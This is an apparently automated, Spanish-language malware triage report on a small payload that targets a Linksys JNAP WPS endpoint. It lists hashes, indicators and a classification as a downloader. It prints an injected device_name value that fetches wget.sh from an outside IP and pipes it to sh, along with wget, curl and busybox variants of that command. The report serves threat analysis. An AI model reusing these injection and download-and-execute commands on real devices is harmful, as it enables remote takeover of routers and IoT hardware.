# 🧬 Payload Analysis

`5728d6f16d262a5cfe6ab7f09d971bc122f914d916f99556680c664839c7fd85`

## 📌 Resumen

Texto ASCII de 397 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `GetStationInfo` en `hxxp://linksys[.]com/jnap/wpsstationinfo/GetStationInfo`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `sh -s lwps`
2. `busybox wget hxxp://91.92.40.XXX/wget.sh -O-`
3. `curl hxxp://91.92.40.XXX/wget.sh`
4. `wget hxxp://91.92.40.XXX/wget.sh -O-`
5. `busybox wget hxxp://91.92.40.XXX` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Perfil técnico:** `Linux / BusyBox`, compatible con sistemas embebidos o IoT. BusyBox se trata como indicio de plataforma y no como prueba suficiente de que el dispositivo sea IoT. **Ficha malware:** [malware-like/oraculo/downloader/5728d6f16d262a5cfe6ab7f09d971bc122f914d916f99556680c664839c7fd85.md](../../../../../malware-like/oraculo/downloader/5728d6f16d262a5cfe6ab7f09d971bc122f914d916f99556680c664839c7fd85.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:49:46.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `5728d6f16d262a5cfe6ab7f09d971bc122f914d916f99556680c664839c7fd85`
- **SHA1:** `74da4dc251eecf8fa2963422b39722bd1cbdfc77`
- **MD5:** `80af35ffe1d56d6c0e8661e195538aec`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 397 B |
| Entropía | 5.28 |
| Strings | 7 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=6

## 🖥️ Comandos observados / extraídos

```text
device_name=cd%20/tmp%3Bwget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20lwps%3Bbusybox%20wget%20http://91.92.40.XXX
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://linksys[.]com/jnap/wpsstationinfo/GetStationInfo | strings |
| url | hxxp://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20lwps%3Bbusybox%20wget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20lwps%3Bcurl%20http://91.92.40.XXX/wget.sh%7Csh%20-s%20lwps | strings |
| ip | 190.179.139.XXX | static_analysis |
| ip | 91.92.40.XXX | static_analysis |
| command | device_name=cd%20/tmp%3Bwget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20lwps%3Bbusybox%20wget%20http://91.92.40.XXX | strings |
| hash | 5728d6f16d262a5cfe6ab7f09d971bc122f914d916f99556680c664839c7fd85 | static_analysis |
| ip | 45.153.34.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
